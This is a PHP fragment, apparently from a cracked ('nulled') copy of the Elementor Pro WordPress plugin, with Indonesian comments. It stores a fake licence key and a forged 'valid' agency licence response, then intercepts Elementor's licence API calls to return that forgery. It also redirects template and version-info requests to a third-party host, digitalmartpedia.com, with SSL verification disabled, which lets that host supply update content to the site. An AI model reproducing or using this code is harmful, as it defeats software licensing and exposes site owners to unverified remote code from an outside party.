...
/* Mendefinisikan */
if(!defined('ELEMENTOR_COREPRO_LKEY')) define('ELEMENTOR_COREPRO_LKEY', strrev('6c25235988b76fba0784a62e756106d9'));
if(!defined('ELEMENTOR_COREPRO_GPLEXP')) define('ELEMENTOR_COREPRO_GPLEXP', date('Y-m-d H:i:s', '2025259380'));
if(!defined('ELEMENTOR_COREPRO_RSPN')){
	define('ELEMENTOR_COREPRO_RSPN', '{"success":true,"license":"valid","item_name":"Elementor Pro","license_limit":"100","site_count":"1","expires":"'.ELEMENTOR_COREPRO_GPLEXP.'","activations_left":"99","payment_id":"362987","customer_name":"'.strrev('naivaD einnoL').'","customer_email":"'.strrev('moc.orp-emeht@ofni').'","tier":"agency","features":[]}');
}

/* Menghapus lisensi versi lama */
if(get_option('_elementor_pro_license_data')){
	delete_option('_elementor_pro_license_data');
}

/* Memperbarui lisensi versi 2 */
update_option('elementor_pro_license_key', ELEMENTOR_COREPRO_LKEY);
update_option('_elementor_pro_license_v2_data', [
	'timeout' => strtotime('+12 hours', current_time('timestamp')),
	'value'   => ELEMENTOR_COREPRO_RSPN
]);

add_filter('elementor/connect/additional-connect-info', '__return_empty_array', 999);

/* Memperbarui respon API lisensi dan template */
add_filter('pre_http_request', function($preempt, $parsed_args, $url){
	/* Ini adalah respon API lisensi */
	if(strpos($url, 'my.elementor.com/api/v2/licenses') !== false){
		$req = array(
			'headers'   => array(),
			'cookies'   => array(),
			'body'      => ELEMENTOR_COREPRO_RSPN,
	...
	if(strpos( $url, 'my.elementor.com/api/connect/v1/library/get_template_content') !== false){
		$template = isset($parsed_args['body']['id']) ? $parsed_args['body']['id'] : false;
		$turl = 'https://digitalmartpedia.com/buckets/plugins/elementor/templates/' . $template . '.json';
		$req = wp_remote_get( $turl, [ 'sslverify' => false, 'timeout' => 120 ] );
		if(wp_remote_retrieve_response_code($req) == 200){
			return $req;
		}
	}
	if(strpos($url,'my.elementor.com/api/v2/pro/info') !== false){
		$dmpver = 'https://digitalmartpedia.com/buckets/plugins/elementor/get_version.json';
		$req = wp_remote_get( $dmpver, ['sslverify' => false, 'timeout' => 120]);
		if(!is_wp_error($req)){
			return $req;
		}
	}
